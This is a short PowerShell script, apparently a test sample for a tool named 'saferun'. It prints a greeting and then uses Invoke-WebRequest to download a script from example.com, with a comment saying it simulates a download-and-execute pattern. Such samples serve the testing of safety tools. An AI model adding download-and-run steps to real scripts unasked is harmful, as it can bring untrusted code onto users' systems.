Write-Output "Hello from saferun (PowerShell)"

# Simulate download + execution pattern
Invoke-WebRequest https://example.com/script.ps1 -OutFile script.ps1